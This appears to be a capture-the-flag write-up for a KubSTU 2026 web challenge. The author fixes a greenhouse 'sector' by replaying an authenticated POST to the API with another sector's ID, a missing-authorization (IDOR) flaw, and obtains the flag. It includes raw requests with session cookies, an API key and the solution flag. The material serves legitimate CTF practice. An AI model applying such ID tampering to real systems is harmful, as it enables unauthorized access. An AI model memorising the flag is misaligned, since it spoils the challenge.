---
layout: post
title:  "CapyAgro Crop Rescue"
date:   2026-05-02 19:17:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /KubSTU-2026-capyagro-crop-rescue/
---

**Author**: [@cyber_meow](https://t.me/cyber_meow)

**Category**: Web

**Description**: In experimental greenhouse No. 3 on the territory of CapyAgro, the control system has failed. Staff engineers cannot access the control panel. Plants are dying. As external auditors, you need to find a way to regain control of the system and return the parameters to normal. [http://45.146.165.92](http://45.146.165.92) [http://155.212.186.67](http://155.212.186.67)

Both links are the same. I go to the site and register and login:

![Alt text](/images/kubstuweb1.png)

I can see what the parameters should be for sector 3. When I update them correctly I make this request:
```http
POST /api/sector/395/adjust HTTP/1.1
Host: 155.212.186.67
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://155.212.186.67/dashboard
Content-Type: application/json
X-API-Key: test_key_123
Content-Length: 25
Origin: http://155.212.186.67
DNT: 1
Connection: keep-alive
Cookie: web_session=cb1d5f2f81577f74; session=.eJyrVirKz0lVslIqLU4tUtIBU_GZKUpWpuYQTl5iLli6KlOpFgBUOg7T.afUs7A.3223erQgBfzz4PJ9ybj38s98-ag
Priority: u=0

{"temp":24,"humidity":65}
```

This fixes the sector. On `http://155.212.186.67/capyagro` I find sector 4 (api endpoint `/api/sector399`):

![Alt text](/images/kubstuweb2.png)

There is no `Configure Parameters` button for this one. I send this request to fix it:
```http
POST /api/sector/399/adjust HTTP/1.1
Host: 155.212.186.67
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://155.212.186.67/dashboard
Content-Type: application/json
X-API-Key: test_key_123
Content-Length: 25
Origin: http://155.212.186.67
DNT: 1
Connection: keep-alive
Cookie: web_session=cb1d5f2f81577f74; session=.eJyrVirKz0lVslIqLU4tUtIBU_GZKUpWpuYQTl5iLli6KlOpFgBUOg7T.afUs7A.3223erQgBfzz4PJ9ybj38s98-ag
Priority: u=0

{"temp":24,"humidity":65}
```

I get this response:
```http
HTTP/1.1 200 OK
Content-Length: 462
Content-Type: application/json
Date: Fri, 01 May 2026 22:57:13 GMT
Server: Werkzeug/3.0.1 Python/3.11.15
Vary: Cookie

{
  "all_capyagro_saved": true,
  "flag": "KubSTU(Sav3d_th3_CapyArg0S3ct0r)",
  "message": "\u0412\u0441\u0435 \u0441\u0435\u043a\u0442\u043e\u0440\u0430 CapyAgro \u0432\u043e\u0441\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u044b! \u0423\u0440\u043e\u0436\u0430\u0439 \u0441\u043f\u0430\u0441\u0451\u043d!",
  "sector": {
    "humidity": 65.0,
    "id": 399,
    "is_capyagro": true,
    "sector_number": 4,
    "temp": 24.0
  },
  "success": true
}
```

`KubSTU(Sav3d_th3_CapyArg0S3ct0r)`